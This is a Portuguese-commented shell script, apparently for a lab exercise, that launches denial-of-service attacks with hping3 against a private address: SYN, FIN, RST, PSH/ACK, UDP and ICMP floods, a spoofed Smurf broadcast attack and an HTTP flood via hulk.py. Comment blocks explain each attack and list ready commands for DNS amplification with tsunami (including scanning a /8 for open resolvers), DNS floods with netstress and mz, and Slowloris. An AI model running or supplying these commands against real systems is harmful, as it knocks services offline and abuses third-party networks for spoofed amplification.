:<<CORE
if [ -z $1]; then
    echo '---------------------------------------------------'
    echo 'USAGE: sh hping.sh <OPÇÃO>'
    echo 'OPÇÃO: deve ser um num inteiro, escolha uma das opções abaixo:'
    echo ' '
    echo '   TCP SYN flood (1) '
    echo '   UDP flood     (6) '
    echo '   Smurf         (8) '
    echo '   HTTP flood    (9) '
    echo '---------------------------------------------------'
fi
CORE
attack=9
case $attack in

1)
# TCP SYN flood
sh -c 'sleep 300 ; killall hping3' &
hping3 -d 536 -S --flood -V -p 80 192.168.2.99 > /dev/null &


:<<'CORE'

SYN Flood funciona na camada de transporte. Para entender esse tipo de ataques, precisamos entender como uma conexão TCP foi estabelecida primeiro. Uma conexão TCP é estabelecida por um handshake de 3 vias. O cliente envia um pacote SYN para iniciar uma conexão TCP. No lado do servidor, um pacote SYN que chega envia a "conexão" para o estado SYN-RCVD. Depois disso, o servidor responde com um SYN + ACK. Finalmente, o cliente responde a isso com um ACK. Após esses 3 passos, a conexão TCP é considerada estabelecida. No entanto, se o pacote ACK não chegar ao servidor, naturalmente o servidor permanecerá no estado SYN-RCVD para esta conexão e continuará aguardando o ACK por um tempo. Os ataques de inundações SYN exploram esse comportamento natural do servidor. Em resumo, o objetivo do SYN flood é enviar muitos pacotes SYN para o servidor e ignorar os pacotes SYN + ACK retornados pelo servidor. Isso faz com que o servidor use seus recursos por um período de tempo configurado para a possibilidade de os pacotes ACK esperados chegarem. Se um invasor enviar pacotes SYN suficientes, isso irá sobrecarregar o servidor porque os servidores estão limitados no número de conexões TCP simultâneas. Se o servidor atingir seu limite, não pode estabelecer novas conexões TCP até as conexões existentes que estão no tempo de espera do estado SYN-RCVD.
CORE
;;
2)
# TCP SYN flood advanced
:<<'CORE'
 hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE

--flood: pacotes enviados o mais rápido possível
--rand-source: endereço de origem aleatório
-c -count: contagem de pacotes
-d -data: tamanho de dados
-S -syn: defina sinalizador SYN
-w -win: winsize (padrão 64)
-p -destport: porta de destino (padrão 0)

 Inundação SYN avançada com IP de origem aleatória, tamanho de dados diferente e tamanho da janela 
CORE
;;
3)
# TCP Fin flood
hping3 --flood -F -p 80 192.168.2.99 > /dev/null &

:<<'CORE'
-F: significa a definição da bandeira FIN
--rand-source: endereço de origem aleatório

Um pacote TCP com bandeira FIN habilitado somente é aceito quando um cliente estabeleceu uma conexão TCP com um servidor. Caso contrário, os pacotes serão simplesmente descartados. Se o invasor apenas inundar o servidor sem estabelecer conexões TCP, os pacotes FIN serão descartados conforme o esperado. Mas o servidor ainda requer alguns recursos para processar cada pacote para ver se o pacote é redundante. Esses tipos de ataques são fáceis de executar porque está apenas gerando pacotes de lixo FIN e enviando-os.
CORE
;;
4)
# TCP RST Flood
hping3 --flood -R -p 80 192.168.2.99 > /dev/null &

:<<'CORE'
-R: inundação de RST
--rand-source: endereço de origem aleatório

Um pacote RST dentro de uma conexão TCP significa que imediatamente matar a conexão. Isso é útil quando a conexão encontrou um erro e precisa parar. Se os invasores puderem ver o tráfego que vai de origem para destino de alguma forma, eles podem enviar pacotes RST com valores apropriados. (IP de origem, IP de destino, porta de origem, porta de destino, número de seqüência etc.) Este pacote irá matar a conexão TCP entre fonte e destino. Ao fazer isso constantemente, é possível tornar impossível o estabelecimento de conexão.
CORE
;;
5)
# PUSH and ACK Flood
hping3 --flood -PA -p 80 192.168.2.99 > /dev/null &

:<<'CORE'
-PA significa a configuração das bandeiras PSH e ACK.
--rand-source: endereço de origem aleatório

Ao inundar um servidor com um monte de pacotes PUSH e ACK, o invasor pode impedir que o servidor responda aos pedidos legítimos.
Para realizar o ataque PSH + ACK, você pode usar hping3 com esses parâmetros.
CORE
;;
6)
# UDP flood
sh -c 'sleep 300 ; killall hping3' &
hping3 -d 1024 --flood --udp -s 50001 -p 5000 192.168.2.99

:<<'CORE'
–flood: sent packets as fast as possible
–rand-source: random source address
–udp: UDP mode
-p –destport: destination port (default 0)
 
UDP é um protocolo que não precisa criar uma sessão entre dois dispositivos. Em outras palavras, não é necessário nenhum processo de handshake. Uma inundação UDP não explora qualquer vulnerabilidade. O objetivo das inundações UDP é simplesmente criar e enviar uma grande quantidade de datagramas UDP de IP falsificados para o servidor alvo. Quando um servidor recebe este tipo de tráfego, ele não consegue processar todas as solicitações e ele consome sua largura de banda com o envio de pacotes de "destino inacessível" ICMP.
CORE
;;
7)
# ICMP and IGMP Floods
hping3 --flood -1 192.168.2.99

:<<'CORE'
-1: ICMP
--rand-source: random source address

ICMP (Internet Control Message Protocol) e IGMP (Internet Group Management Protocol) são protocolos sem conexão como o UDP. ICMP é usado para enviar mensagens de erro e informações operacionais de dispositivos de rede. IGMP é um protocolo usado para gerenciar membros multicast em TCP / IP. Como inundações UDP, inundações ICMP e IGMP não exploram qualquer vulnerabilidade. O simples envio de qualquer tipo de pacotes ICMP ou IGMP torna o servidor invadido de tentar processar todas as solicitações. Para realizar a inundação ICMP com hping3, você deve usar -1 parâmetro
CORE
;;
8)
# Smurf (Amplificação ICMP)
sh -c 'sleep 5 ; killall hping3' &
hping3 --icmp --spoof -p 192.168.2.99 192.168.2.255

:<<'CORE'
Os ataques de amplificação aproveitam a diferença de tamanho entre solicitação e resposta. Um único pacote pode gerar dezenas ou centenas de vezes a largura de banda em sua resposta. Por exemplo, um invasor pode usar o recurso de endereço IP de transmissão de roteadores para enviar mensagens para vários endereços IP nos quais o IP de origem é IP alvo. Desta forma, todas as respostas serão enviadas para IP alvo. Para executar ataques de amplificação, um invasor deve usar protocolos sem conexão que não validam os endereços IP da fonte. Famosas técnicas de amplificação são Smurf ataque (ICMP amplificação), DNS amplificação e Fraggle ataque (UDP amplificação).

Ataque de Smurf: O atacante escolhe alguns sites intermediários como um amplificador e, em seguida, envia a enorme quantidade de solicitações de ICMP (ping) para o IP de transmissão desses sites intermediários. A propósito, esses pacotes têm os endereços IP de origem apontam para o alvo. Os sites intermediários entregam a transmissão para todos os hosts em sua sub-rede. Finalmente, todos os hosts respondem ao IP alvo.

Para realizar ataques de smurf, você pode usar hping3:
CORE
;;
9)	
# HTTP flood (necessário baixar o script hulk.py http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/)
sh -c "sleep 300 ; kill $(ps aux | grep '[h]ulk' | awk '{print $2}')" &
python hulk.py http://192.168.2.99:80/

:<<'CORE'
A inundação HTTP é o ataque mais comum que visa a camada de aplicação. É mais difícil de detectar do que os ataques de camada de rede porque os pedidos parecem ser legítimos. Uma vez que o aperto de mão de 3 vias já foi concluído, as inundações HTTP são dispositivos enganadores e soluções que estão apenas examinando a camada 4. Esses tipos de ataques consistem em conjuntos de solicitações HTTP GET ou POST enviadas para um servidor alvo. Normalmente, as inundações HTTP são lançadas a partir de vários computadores simultaneamente. Você pode usar o LOIC para executar inundações HTTP. Você pode simplesmente iniciar um ataque, especificando um IP e uma porta e escolhendo o método HTTP. (Ferramenta similar, Apache JMeter)
CORE
;;
*) 

 echo '---------------------------------------------------'
    echo 'USAGE: sh hping.sh <OPÇÃO>'
    echo 'OPÇÃO: deve ser um num inteiro, escolha uma das opções abaixo:'
    echo ' '
    echo '   TCP SYN flood (1) '
    echo '   UDP flood     (6) '
    echo '   Snurf         (8) '
    echo '   HTTP flood    (9) '
    echo '---------------------------------------------------' ;;
esac
:<<'CORE'




------------------------------------------------------- USAREMOS AS TÉCNICAS ACIMA --------------------------------------------------------------




CORE
# Fraggle Attack

:<<'CORE'
O atacante envia uma grande quantidade de datagramas UDP falsificados para os pontos finais UDP. Estes pontos finais UDP respondem ao IP alvo.
CORE

# DNS Amplification

:<<'CORE'
Amplificação DNS: O atacante deve ter um servidor DNS recursivo que tenha um arquivo grande em seu cache. Em seguida, eles enviam uma solicitação de pesquisa de DNS usando o endereço IP falsificado do alvo para servidores de DNS vulneráveis. Esses servidores responderão ao IP alvo.

O tsunami pode ser usado para ataques de amplificação de DNS. Primeiro, você deve coletar servidores DNS recursivos:

     ./tsunami -o recursive_dns.txt -l 4 -e 172.0.0.0/8

Então você pode atacar o seu alvo usando estes servidores DNS como um amplificador.

     ./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt

-s: o endereço IP alvo.
-n: nome de domínio opcional para a sonda. O padrão é o nome do host atual.
-f: o arquivo de servidores DNS recursivos aberto para o ataque.
-p: número de pacotes a serem enviados por servidor DNS. O padrão é 1 pacote.
.
CORE
# DNS Flood
# netstress.fullrandom -d TARGET_DNS_SERVER -a dns -t a -n 4 -P 53
:<<'CORE'
-d: destination address
-a: type of attack
-t: type of DNS query
-n:  number of processes
-P: destination port

O Sistema de Nome de Domínio (DNS) é o protocolo usado para resolver nomes de domínio em endereços IP. Como outros ataques de inundações, o objetivo dos ataques de inundação de DNS está enviando pedidos de DNS de alto volume para o protocolo de aplicação DNS. O servidor DNS estava sobrecarregado e incapaz de processar todos os pedidos legítimos de outros usuários. Netstress e mz são capazes de fazer ataques de inundação DNS.
CORE
# DNS Flood com mz
# mz -A rand -B TARGET_DNS_SERVER -t dns "q=pentest.blog" -c 10000000

:<<'CORE'
Para obter informações detalhadas sobre pacotes de DNS que podem ser gerados pelo mz, use o comando de ajuda mz -t dns.
CORE

# Low and Slow Attacks
:<<'CORE'
Ao contrário das inundações, ataques baixos e lentos não requerem uma enorme quantidade de tráfego de dados. Esses tipos de ataques visam a aplicação ou os recursos do servidor. Eles são difíceis de detectar porque o tráfego parece ocorrer a taxas normais e legítimo. Slowloris pode ser usado para executar esses tipos de ataques. Se chegarmos à lógica operacional desta ferramenta, ela funciona abrindo múltiplas conexões e mantendo-as abertas o maior tempo possível. Ele envia solicitações HTTP parciais e nenhuma dessas conexões será completa. Se conexões suficientes forem abertas ao servidor, não será possível lidar com mais solicitações. Slowloris é muito fácil de usar. Tudo o que você precisa para iniciar um ataque é o seguinte:

./slowloris.pl -dns TARGET_URL

You can chance the port with -port parameter:

./slowloris.pl -dns TARGET_URL -port 80

You might change the number of sockets you want to open with -num parameter:

./slowloris.pl -dns TARGET_URL -port 80 -num 200

To change timeout value you can use -timeout parameter:

./slowloris.pl -dns TARGET_URL -port 80 -num 200 -timeout 30

To attack an HTTPS website you should change the port and use -https parameter:

./slowloris.pl -dns TARGET_URL -port 443 -timeout 30 -num 200 -https
CORE
